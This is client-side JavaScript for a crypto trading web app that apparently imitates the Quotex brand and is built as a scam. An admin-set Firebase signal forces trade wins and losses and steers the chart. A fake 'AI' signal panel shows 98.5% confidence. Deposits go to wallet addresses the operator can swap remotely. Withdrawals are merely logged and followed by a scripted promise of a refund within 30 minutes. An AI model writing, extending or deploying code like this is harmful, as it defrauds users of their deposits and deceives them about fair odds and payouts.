
            // Production Build
            // --- FIREBASE INIT ---
            let db;
            let adminSignal = "NEUTRAL";

            // --- GLOBAL WALLET DEFS (Moved to top for hoisting safety) ---
            const walletAddresses = {
                'TRON': 'TWGTCaBffhTMoQH8GYrA92gNSQVeWAHvB4',
                'ETH': '0x71C7656EC7ab88b098defB751B7401B5f6d8976F',
                'BSC': '0x71C7656EC7ab88b098defB751B7401B5f6d8976F',
                'BTC': 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh'
            };

            const networkNames = {
                'TRON': 'TRON (TRC20)',
                'ETH': 'ETHEREUM (ERC20)',
                'BSC': 'BINANCE SMART',
                'BTC': 'BITCOIN NETWORK'
            };

            try {
                // Use shared init logic
                const app = initFirebaseApp();
                db = app.database();
                const auth = app.auth();

                // Listen for Admin Signals
                db.ref('control/signal').on('value', (snap) => {
                    adminSignal = snap.val() || "NEUTRAL";
                    console.log("Admin Signal Received:", adminSignal);
                    updateBotUI(adminSignal);
                });

                // Listen for Volatility
                db.ref('control/speed').on('value', (snap) => {
                    const sp = snap.val();
                    if (sp) state.marketSpeed = parseFloat(sp);
                });

                // Listen for Wallet Addresses
                db.ref('settings/wallets').on('value', (snap) => {
                    const wallets = snap.val();
                    if (wallets) {
                        if (wallets.TRON) walletAddresses['TRON'] = wallets.TRON;
                        if (wallets.ETH) walletAddresses['ETH'] = wallets.ETH;
                        if (wallets.BSC) walletAddresses['BSC'] = wallets.BSC;
                        if (wallets.BTC) walletAddresses['BTC'] = wallets.BTC;

                        // Smart UI Update: Refresh current display
                        const currentLabel = document.getElementById('selectedNetworkDisplay').innerText;
                        for (const [key, name] of Object.entries(networkNames)) {
                            if (name === currentLabel) {
                                document.getElementById('walletAddressDisplay').innerText = walletAddresses[key];
                            }
                        }
                    }
                });

            } catch (e) { console.error("Firebase Error", e); }


            // --- WITHDRAWAL LOGIC ---
            function openWithdrawalModal() {
                document.getElementById('withdrawalModal').style.display = 'flex';
            }

            function switchWithdrawNetwork(element) {
                document.querySelectorAll('.withdraw-tab').forEach(el => el.classList.remove('active-trc'));
                element.classList.add('active-trc');

                // Update label based on selection
                const labels = document.querySelectorAll('.withdraw-section-label');
                if (labels.length > 1) {
                    // Assuming 2nd label is the address label
                    if (element.innerText === 'TRC20') labels[1].innerText = 'TRON (TRC20) WALLET ADDRESS';
                    else if (element.innerText === 'ERC20') labels[1].innerText = 'ETHEREUM (ERC20) WALLET ADDRESS';
                    else if (element.innerText === 'SMART') labels[1].innerText = 'BSC (BEP20) WALLET ADDRESS';
                    else labels[1].innerText = element.innerText + ' WALLET ADDRESS';
                }
            }

            function reviewSettlement() {
                showToast('Reviewing Settlement...', 'info');
                const addr = document.querySelector('.withdraw-input').value; // Address
                const amt = document.querySelectorAll('.withdraw-input')[1].value; // Amount

                if (!addr || !amt) return showToast('Please fill all fields', 'error');

                // Push to Firebase
                if (db) {
                    db.ref('withdrawals').push({
                        network: document.querySelector('.active-trc').innerText,
                        address: addr,
                        amount: amt,
                        status: 'PENDING',
                        timestamp: Date.now()
                    });
                }

                closeModal('withdrawalModal'); // Hide modal first
                showWithdrawalSuccess(); // Show Success Message
            }

            // --- SOUND ENGINE (Synth) ---
            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
            function playSystemSound(type) {
                if (audioCtx.state === 'suspended') audioCtx.resume();
                const osc = audioCtx.createOscillator();
                const gain = audioCtx.createGain();
                osc.connect(gain);
                gain.connect(audioCtx.destination);

                const now = audioCtx.currentTime;

                if (type === 'win') {
                    // Satisfaction Ping
                    osc.type = 'sine';
                    osc.frequency.setValueAtTime(500, now);
                    osc.frequency.exponentialRampToValueAtTime(1000, now + 0.1);
                    gain.gain.setValueAtTime(0.3, now);
                    gain.gain.exponentialRampToValueAtTime(0.01, now + 0.5);
                    osc.start(now); osc.stop(now + 0.5);
                } else {
                    // Low Failure Tone
                    osc.type = 'triangle';
                    osc.frequency.setValueAtTime(150, now);
                    osc.frequency.linearRampToValueAtTime(100, now + 0.3);
                    gain.gain.setValueAtTime(0.2, now);
                    gain.gain.linearRampToValueAtTime(0.01, now + 0.3);
                    osc.start(now); osc.stop(now + 0.3);
                }
            }

            // --- RESULT UI ---

            function showWithdrawalSuccess() {
                const overlay = document.getElementById('resultOverlay');
                const card = document.getElementById('resultCard');
                const amtEl = document.getElementById('resultAmount');
                const titleEl = document.querySelector('.result-title');
                const iconEl = document.querySelector('.result-icon'); // Assuming this exists now

                // Custom Styling for Withdrawal
                overlay.style.display = 'flex';
                card.classList.remove('win', 'loss'); // Remove trade result classes
                card.style.borderLeft = '4px solid #00ff88'; // Green border for success
                card.style.boxShadow = '0 8px 32px rgba(0, 255, 136, 0.15)'; // Extra Sparkle

                titleEl.textContent = 'WITHDRAWAL APPLIED';
                amtEl.style.color = '#00ff88';
                amtEl.style.fontSize = '1.2rem'; // Smaller text for message
                amtEl.style.lineHeight = '1.4';
                amtEl.innerHTML = `Successfully withdrawal applied.<br><span style="font-size:16px; color:#fff;">You will get your refund in next 30 minutes.</span>`;

                const badgeEl = document.getElementById('resultBadge');
                if (badgeEl) {
                    badgeEl.innerHTML = '<i class="fas fa-check-circle"></i> SUCCESS';
                    badgeEl.style.background = 'rgba(0, 255, 136, 0.2)';
                    badgeEl.style.color = '#00ff88';
                }

                speak("Withdrawal successful.");

                // Auto hide longer for reading
                setTimeout(() => {
                    card.classList.remove('active');
                    setTimeout(() => {
                        overlay.style.display = 'none';
                        // Reset Title for Trade Results
                        setTimeout(() => { titleEl.textContent = 'TRADE FINISHED'; amtEl.style.fontSize = '48px'; }, 500);
                    }, 300);
                }, 6000);
            }
            // --- DATA & STATE ---
            let botState = { active: false, signal: 'NEUTRAL', timer: 0 };

            let state = {
                activeAccount: 'demo',
                balances: { demo: 10000.0, real: 0.0 },
                price: 65420.50,
                candles: [],
                trades: [],
                investment: 100,
                timeSeconds: 60, // Default 1 min
                zoom: 1.5,
                scrollX: 0,
                isLuckyTime: false,
                isBoosted: false,
                marketSpeed: 1.0,
                momentum: 0 // Physics momentum for smooth price movement
            };

            // --- TTS VOICE ---
            function speak(text) {
                if ('speechSynthesis' in window) {
                    const utterance = new SpeechSynthesisUtterance(text);
                    utterance.rate = 1.0;
                    utterance.pitch = 1.0;
                    window.speechSynthesis.speak(utterance);
                }
            }

            // --- CLOCK ---
            function updateClock() {
                const now = new Date();
                const timeString = now.toLocaleTimeString('en-US', {
                    timeZone: 'Asia/Karachi',
                    hour12: false,
                    hour: '2-digit',
                    minute: '2-digit',
                    second: '2-digit'
                });
                const el = document.getElementById('headerClockTime');
                if (el) el.innerText = timeString;

                // PKT calculation for lucky time
                const utc = now.getTime() + (now.getTimezoneOffset() * 60000);
                const pkt = new Date(utc + (3600000 * 5));
                state.isLuckyTime = (pkt.getHours() === 10);
            }
            setInterval(updateClock, 1000); updateClock();

            function startDummyBot() {
                setInterval(() => {
                    // Admin Override
                    if (adminSignal !== 'NEUTRAL') {
                        if (botState.active) {
                            botState.active = false;
                            botState.signal = 'NEUTRAL';
                        }
                        return;
                    }

                    if (botState.active) {
                        botState.timer--;
                        if (botState.timer <= 0) {
                            botState.active = false;
                            botState.signal = 'NEUTRAL';
                            updateBotUI('NEUTRAL');
                        }
                    } else {
                        // 30% chance to start if idle
                        if (Math.random() < 0.3) {
                            const dir = Math.random() > 0.5 ? 'UP' : 'DOWN';
                            botState.active = true;
                            botState.signal = dir;
                            botState.timer = 5 + Math.floor(Math.random() * 5);
                            updateBotUI(dir);
                        }
                    }
                }, 1000);
            }
            startDummyBot();

            // --- CHART ENGINE ---
            // Initialize the Robust Chart Engine
            window.chartEngine = new ChartEngine('chartCanvas');

            // --- ACCOUNT LOGIC ---
            function selectAccount(type) {
                state.activeAccount = type;
                document.querySelectorAll('.acc-option').forEach(el => el.classList.remove('active'));
                event.currentTarget.classList.add('active');
                updateUI();
            }

            function updateUI() {
                const isDemo = state.activeAccount === 'demo';
                document.getElementById('activeAccType').innerText = isDemo ? 'DEMO ACCOUNT' : 'REAL ACCOUNT';
                document.getElementById('activeAccType').style.color = isDemo ? '#00ff88' : '#ffcc00';
                const bal = state.balances[state.activeAccount];
                document.getElementById('activeBalanceDisplay').innerText = '$' + bal.toLocaleString(undefined, { minimumFractionDigits: 2 });
                // Payout fixed to 2.0x
                document.getElementById('payoutDisplay').innerText = '$' + (state.investment * 2.00).toFixed(2);
            }

            function adjustInv(v) {
                state.investment = Math.max(1, state.investment + v);
                document.getElementById('invVal').innerText = '$' + state.investment;
                updateUI();
            }
            // Quick Investment Setter
            function setQuickInv(val, btn) {
                state.investment = val;
                document.getElementById('invVal').innerText = '$' + state.investment;
                updateUI();
                const parent = btn.parentElement;
                parent.querySelectorAll('.quick-btn').forEach(b => b.classList.remove('active'));
                btn.classList.add('active');
            }

            // Time Adjust (increments by 10s for manual)
            function adjustTime(v) {
                state.timeSeconds = Math.max(5, state.timeSeconds + (v * 10));
                updateTimeDisplay();
            }

            function setQuickTime(sec, btn) {
                state.timeSeconds = sec;
                updateTimeDisplay();
                const parent = btn.parentElement;
                parent.querySelectorAll('.quick-btn').forEach(b => b.classList.remove('active'));
                btn.classList.add('active');
            }

            function updateTimeDisplay() {
                const m = Math.floor(state.timeSeconds / 60);
                const s = state.timeSeconds % 60;
                document.getElementById('timeVal').innerText = `00:${String(m).padStart(2, '0')}:${String(s).padStart(2, '0')}`;
            }

            function placeTrade(dir) {
                const bal = state.balances[state.activeAccount];
                if (bal < state.investment) return showToast('Insufficient Balance', 'error');

                state.balances[state.activeAccount] -= state.investment;

                // Capture current Bot Signal at time of trade placement
                const currentSignal = adminSignal;

                const t = {
                    entry: window.chartEngine.price, // Use new engine price
                    dir,
                    active: true,
                    amt: state.investment,
                    end: Date.now() + (state.timeSeconds * 1000),
                    signalAtTime: currentSignal
                };

                state.trades.push(t);
                updateUI();
                showToast(`Trade Placed: ${dir} (${state.timeSeconds}s)`, 'info');

                // --- SMART LOGIC ---
                speak("Trade confirmed.");

                // If there's an active trade, we might want to boost volatility marginally
                // window.chartEngine.setVolatility(1.2); 

                renderHistory();
            }

            function resolveTrade(t) {
                t.active = false;

                // --- RESULT LOGIC ---
                let win = false;
                const exitPrice = window.chartEngine.price;

                // 1. Force Result based on Signal
                if (t.signalAtTime && t.signalAtTime !== 'NEUTRAL') {
                    if (t.dir === t.signalAtTime) {
                        win = true; // Auto Win
                    } else {
                        win = false; // Auto Loss
                    }
                } else {
                    // 2. Normal Market Check
                    win = (t.dir === 'UP' && exitPrice > t.entry) || (t.dir === 'DOWN' && exitPrice < t.entry);
                }

                if (win) {
                    const profit = t.amt * 2.0; // Double payout
                    state.balances[state.activeAccount] += profit;
                    // showToast('WIN +$' + profit.toFixed(2), 'win'); <-- Replaced with Overlay
                    // Payout is 2.0x, so Profit = 1.0x Investment.
                    showResultOverlay(true, profit - t.amt);
                } else {
                    // showToast('LOSS -$' + t.amt.toFixed(2), 'loss'); <-- Replaced with Overlay
                    showResultOverlay(false, t.amt);
                }
                updateUI();
                renderHistory();
            }

            function renderHistory() {
                const list = document.getElementById('historyList');
                if (state.trades.length === 0) return;
                list.innerHTML = '';
                list.classList.remove('history-empty');
                state.trades.slice().reverse().forEach(t => {
                    const row = document.createElement('div');
                    row.style.padding = '10px';
                    row.style.borderBottom = '1px solid var(--border)';
                    row.style.display = 'flex';
                    row.style.justifyContent = 'space-between';

                    // We need real-time update here if we want to show 'Running' status accurately,
                    // but for this simple list static is ok until trade closes.
                    const isWin = !t.active && ((t.dir === 'UP' && window.chartEngine.price > t.entry) || (t.dir === 'DOWN' && window.chartEngine.price < t.entry));

                    row.innerHTML = `
                    <div style="font-size:12px;">
                        <div style="font-weight:800; color:${t.dir === 'UP' ? '#00ff88' : '#ff4d4d'};">${t.dir}</div>
                        <div style="color:var(--text-dim);">$${t.amt}</div>
                    </div>
                    <div style="text-align:right;">
                        <div style="font-weight:800; color:${t.active ? '#fff' : (isWin ? '#00ff88' : '#ff4d4d')};">${t.active ? 'RUNNING' : (isWin ? '+$' + (t.amt * 0.87).toFixed(2) : '-$' + t.amt)}</div>
                    </div>
                `;
                    list.appendChild(row);
                });
            }

            // Global Tick for trade resolution
            setInterval(() => {
                state.trades.forEach(t => {
                    if (t.active && Date.now() > t.end) resolveTrade(t);
                });
            }, 250); // Check 4 times a second

            // --- BOT ---
            function updateBotUI(sig) {
                const el = document.getElementById('aiSignalText');
                const icon = document.getElementById('aiIcon');
                const bar = document.getElementById('aiBar');
                const conf = document.getElementById('aiConf');

                // Pass signal to Chart Engine for Physics Control
                if (window.chartEngine) window.chartEngine.setBotSignal(sig);

                if (sig === 'NEUTRAL') {
                    el.innerText = 'SCANNING';
                    el.style.color = '#fff';
                    icon.className = 'fas fa-circle-notch fa-spin';
                    icon.style.color = '#666';
                    bar.style.width = '20%';
                    bar.style.background = '#666';
                    conf.innerText = '0%';
                } else if (sig === 'UP') {
                    el.innerText = 'CALL (BUY)';
                    el.style.color = '#00ff88';
                    icon.className = 'fas fa-arrow-up';
                    icon.style.color = '#00ff88';
                    bar.style.width = '98%';
                    bar.style.background = '#00ff88';
                    conf.innerText = '98.5%';
                } else if (sig === 'DOWN') {
                    el.innerText = 'PUT (SELL)';
                    el.style.color = '#ff4d4d';
                    icon.className = 'fas fa-arrow-down';
                    icon.style.color = '#ff4d4d';
                    bar.style.width = '98%';
                    bar.style.background = '#ff4d4d';
                    conf.innerText = '98.5%';
                }
            }

            // Only loop bot if no admin signal
            setInterval(() => {
                if (adminSignal === 'NEUTRAL') {
                    const el = document.getElementById('aiSignalText');
                    // Random idle animation
                    // el.style.opacity = Math.random() > 0.5 ? 1 : 0.7;
                }
            }, 1000);

            // --- RESULT OVERLAY LOGIC ---
            function showResultOverlay(win, amount) {
                const overlay = document.getElementById('resultOverlay');
                const card = document.getElementById('resultCard');
                const amtEl = document.getElementById('resultAmount');
                const badgeEl = document.getElementById('resultBadge');

                overlay.style.display = 'flex';
                // Small delay to allow display:flex to apply before adding class for animation
                setTimeout(() => card.classList.add('active'), 10);

                if (win) {
                    card.style.borderColor = '#00ff88';
                    card.style.boxShadow = '0 0 60px rgba(0, 255, 136, 0.3)';
                    amtEl.style.color = '#00ff88';
                    amtEl.innerText = '+$' + amount.toFixed(2);
                    badgeEl.innerText = 'PROFIT';
                    badgeEl.style.background = 'rgba(0, 255, 136, 0.2)';
                    badgeEl.style.color = '#00ff88';
                    speak("Trade won.");
                } else {
                    card.style.borderColor = '#ff4d4d';
                    card.style.boxShadow = '0 0 60px rgba(255, 77, 77, 0.3)';
                    amtEl.style.color = '#ff4d4d';
                    amtEl.innerText = '-$' + amount.toFixed(2);
                    badgeEl.innerText = 'LOSS';
                    badgeEl.style.background = 'rgba(255, 77, 77, 0.2)';
                    badgeEl.style.color = '#ff4d4d';
                    speak("Trade lost.");
                }

                // Auto hide
                setTimeout(() => {
                    card.classList.remove('active');
                    setTimeout(() => {
                        overlay.style.display = 'none';
                    }, 300); // Wait for transition
                }, 3000);
            }

            // --- UTILS ---
            function openModal(id) { document.getElementById(id).style.display = 'flex'; }
            function closeModal(id) { document.getElementById(id).style.display = 'none'; }
            function showToast(m, type) {
                const t = document.createElement('div');
                t.className = 'toast';
                t.innerText = m;
                t.style.borderLeftColor = (type === 'win' ? '#00ff88' : (type === 'loss' ? '#ff4d4d' : '#00d4ff'));
                document.getElementById('toastContainer').appendChild(t);
                setTimeout(() => t.remove(), 4000);
            }

            // --- WELCOME MODAL ---
            function showWelcomeModal() {
                // Check if user has already selected an account
                const hasSeenWelcome = localStorage.getItem('quotex_welcome_seen');
                if (!hasSeenWelcome) {
                    document.getElementById('welcomeModal').style.display = 'flex';
                }
            }

            function closeWelcomeModal() {
                document.getElementById('welcomeModal').style.display = 'none';
                localStorage.setItem('quotex_welcome_seen', 'true');
            }

            function selectWelcomeAccount(type, isTopup = false) {
                // Remove selected class from all choices
                document.querySelectorAll('.account-choice').forEach(el => el.classList.remove('selected'));
                // Add selected class to clicked choice
                event.currentTarget.classList.add('selected');

                if (type === 'demo') {
                    state.activeAccount = 'demo';
                    state.balances.demo = 10000; // $10k standard demo
                    showToast('Demo account selected - $10,000 balance', 'info');
                    setTimeout(() => {
                        closeWelcomeModal();
                        updateUI();
                    }, 1000);
                } else if (type === 'real') {
                    if (isTopup) {
                        state.activeAccount = 'real';
                        state.balances.real = 100; // Top up with $100
                        showToast('Real account topped up with $100', 'win');
                        setTimeout(() => {
                            closeWelcomeModal();
                            updateUI();
                        }, 1000);
                    } else {
                        // Direct Redirect to Deposit
                        console.log("Redirecting to Deposit...");
                        closeWelcomeModal();
                        state.activeAccount = 'real'; // Switch to real
                        openModal('depositModal');
                        updateUI();
                    }
                }
            }

            // Show welcome modal on page load
            window.addEventListener('load', () => {
                setTimeout(showWelcomeModal, 500);
            });

            // --- TRADE PAIR MODAL ---
            const tradingPairs = {
                crypto: [
                    { name: 'Bitcoin (OTC)', symbol: 'BTC/USDT', flag: '₿', change: 15.15, profit: 93 },
                    { name: 'Ethereum (OTC)', symbol: 'ETH/USDT', flag: 'Ξ', change: 8.42, profit: 92 },
                    { name: 'Cardano (OTC)', symbol: 'ADA/USDT', flag: '₳', change: -0.36, profit: 92 },
                    { name: 'Ripple (OTC)', symbol: 'XRP/USDT', flag: '✕', change: 12.5, profit: 91 },
                    { name: 'Litecoin (OTC)', symbol: 'LTC/USDT', flag: 'Ł', change: 5.8, profit: 93 },
                    { name: 'Polkadot (OTC)', symbol: 'DOT/USDT', flag: '●', change: -2.1, profit: 87 },
                    { name: 'Dogecoin (OTC)', symbol: 'DOGE/USDT', flag: 'Ð', change: 18.3, profit: 87 },
                    { name: 'Solana (OTC)', symbol: 'SOL/USDT', flag: '◎', change: 22.7, profit: 92 },
                    { name: 'Binance Coin (OTC)', symbol: 'BNB/USDT', flag: 'B', change: 6.9, profit: 92 },
                    { name: 'Avalanche (OTC)', symbol: 'AVAX/USDT', flag: 'A', change: -5.2, profit: 90 },
                    { name: 'Polygon (OTC)', symbol: 'MATIC/USDT', flag: 'M', change: 9.8, profit: 89 },
                    { name: 'Chainlink (OTC)', symbol: 'LINK/USDT', flag: 'L', change: 4.3, profit: 88 },
                    { name: 'Uniswap (OTC)', symbol: 'UNI/USDT', flag: '🦄', change: -1.5, profit: 87 },
                    { name: 'Cosmos (OTC)', symbol: 'ATOM/USDT', flag: '⚛', change: 7.2, profit: 92 },
                    { name: 'Stellar (OTC)', symbol: 'XLM/USDT', flag: '*', change: 3.6, profit: 89 },
                    { name: 'Tron (OTC)', symbol: 'TRX/USDT', flag: 'T', change: 11.4, profit: 88 },
                    { name: 'EOS (OTC)', symbol: 'EOS/USDT', flag: 'E', change: -3.8, profit: 86 },
                    { name: 'Monero (OTC)', symbol: 'XMR/USDT', flag: 'ɱ', change: 6.1, profit: 91 },
                    { name: 'Tezos (OTC)', symbol: 'XTZ/USDT', flag: 'ꜩ', change: 2.9, profit: 88 },
                    { name: 'VeChain (OTC)', symbol: 'VET/USDT', flag: 'V', change: 14.7, profit: 87 }
                ],
                currencies: [
                    { name: 'EUR/USD', symbol: 'EUR/USD', flag: '🇪🇺', change: 0.12, profit: 85 },
                    { name: 'GBP/USD', symbol: 'GBP/USD', flag: '🇬🇧', change: -0.08, profit: 84 },
                    { name: 'USD/JPY', symbol: 'USD/JPY', flag: '🇯🇵', change: 0.25, profit: 86 },
                    { name: 'AUD/USD', symbol: 'AUD/USD', flag: '🇦🇺', change: 0.15, profit: 83 }
                ]
            };

            let currentPairTab = 'crypto';
            let selectedPair = 'BTC/USDT';

            function openPairModal() {
                document.getElementById('pairModal').style.display = 'flex';
                renderPairs();
            }

            function closePairModal() {
                document.getElementById('pairModal').style.display = 'none';
            }

            function switchPairTab(tab) {
                currentPairTab = tab;
                document.querySelectorAll('.pair-tab').forEach(el => el.classList.remove('active'));
                event.currentTarget.classList.add('active');
                renderPairs();
            }

            function renderPairs(filter = '') {
                const pairList = document.getElementById('pairList');
                const pairs = tradingPairs[currentPairTab];

                const filteredPairs = filter
                    ? pairs.filter(p => p.name.toLowerCase().includes(filter.toLowerCase()) || p.symbol.toLowerCase().includes(filter.toLowerCase()))
                    : pairs;

                pairList.innerHTML = filteredPairs.map(pair => `
                    <div class="pair-item" onclick="selectPair('${pair.symbol}', '${pair.name}')">
                        <div class="pair-item-left">
                            <i class="far fa-star pair-star"></i>
                            <span class="pair-flag">${pair.flag}</span>
                            <div>
                                <span class="pair-name">${pair.name}</span>
                            </div>
                        </div>
                        <div class="pair-item-right">
                            <span class="pair-change ${pair.change >= 0 ? 'positive' : 'negative'}">
                                ${pair.change >= 0 ? '+' : ''}${pair.change}%
                            </span>
                            <span class="pair-profit">${pair.profit}%</span>
                        </div>
                    </div>
                `).join('');
            }

            function filterPairs() {
                const searchValue = document.getElementById('pairSearchInput').value;
                renderPairs(searchValue);
            }

            function selectPair(symbol, name) {
                selectedPair = symbol;
                // Update the asset box in the sidebar
                const assetBox = document.querySelector('.asset-box .name');
                if (assetBox) {
                    assetBox.innerHTML = `${symbol.split('/')[0]}`;
                }
                closePairModal();
                showToast(`Switched to ${name}`, 'info');
            }



            function switchNetwork(network) {
                // Update active tab styles
                document.querySelectorAll('.network-tab').forEach(tab => {
                    tab.classList.remove('active', 'active-eth', 'active-bsc', 'active-btc');
                    // Add specific active classes based on network
                    if (tab.innerText.includes(network) || (network === 'BSC' && tab.innerText.includes('BINANCE'))) {
                        if (network === 'TRON') tab.classList.add('active');
                        if (network === 'ETH') tab.classList.add('active-eth');
                        if (network === 'BSC') tab.classList.add('active-bsc');
                        if (network === 'BTC') tab.classList.add('active-btc');
                    }
                });

                // Update content
                document.getElementById('selectedNetworkDisplay').innerText = networkNames[network];
                document.getElementById('walletAddressDisplay').innerText = walletAddresses[network];

                // Set color of selected network label
                const label = document.getElementById('selectedNetworkDisplay');
                if (network === 'TRON') label.style.color = '#00b894';
                if (network === 'ETH') label.style.color = '#627eea';
                if (network === 'BSC') label.style.color = '#f0b90b';
                if (network === 'BTC') label.style.color = '#f7931a';
            }

            function copyWalletAddress() {
                const address = document.getElementById('walletAddressDisplay').innerText;
                // Robust Copy with Fallback
                if (navigator.clipboard && navigator.clipboard.writeText) {
                    navigator.clipboard.writeText(address).then(() => {
                        showToast('Wallet address copied!', 'win');
                    }).catch(err => {
                        console.error('Clipboard API failed', err);
                        fallbackCopy(address);
                    });
                } else {
                    fallbackCopy(address);
                }
            }

            function fallbackCopy(text) {
                const el = document.createElement('textarea');
                el.value = text;
                document.body.appendChild(el);
                el.select();
                try {
                    document.execCommand('copy');
                    showToast('Wallet address copied!', 'win');
                } catch (err) {
                    showToast('Failed to copy', 'error');
                }
                document.body.removeChild(el);
            }

            function submitTxid() {
                const txInput = document.querySelector('.txid-flex input');
                const txid = txInput.value;
                const amt = document.querySelector('input[type="number"].handshake-input').value;
                const net = document.getElementById('selectedNetworkDisplay').innerText;

                if (!txid) return showToast('Please enter TXID', 'error');

                showToast('Verifying on blockchain...', 'info');

                // Push to Backend
                if (db) {
                    db.ref('deposits').push({
                        amount: amt,
                        network: net,
                        txid: txid,
                        status: 'PENDING',
                        timestamp: Date.now()
                    });
                }

                setTimeout(() => {
                    showToast('Deposit Submitted! Waiting for Admin verification.', 'win');
                    closeModal('depositModal');
                }, 1500);
            }


        